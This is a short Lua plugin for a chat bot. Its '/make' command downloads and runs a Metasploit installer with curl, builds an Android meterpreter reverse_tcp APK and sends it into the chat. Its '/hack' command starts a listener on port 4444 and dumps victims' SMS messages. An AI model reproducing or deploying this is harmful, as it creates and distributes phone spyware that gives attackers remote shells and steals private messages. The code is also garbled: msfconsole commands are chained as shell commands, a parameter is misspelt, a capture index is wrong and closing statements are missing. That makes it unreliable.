function run(msg, matches)
if is_admin(msg) then
text = io.popen(" curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall && use android/meterpreter/reverse_tcp && set LHOST *ip address* && set LPORT 4444 && generate -t raw -f "..matches[2]..".apk"):read('*all')
	 send_document(get_receiver(msg), "./"..matches[2]..".apk", ok_cb, false)
  return text
end
return {
  patterns = {
  '^[#/!]make (.*)$'
  },
  run = run,
  moderated = true
}
 function run(msg, matches)
if is_admin(msg) then
text = io.popen("use exploit/multi/handler && set PAYLOAD android/meterpreter/reverse_tcp && set LHSOT 0.0.0.0 && set LPORT 4444 && exploit && dump_sms"):read('*all')
  return text
end
return {
patterns = {
  '^[#/!]hack$'
  },
  run = run,
  moderated = true
}
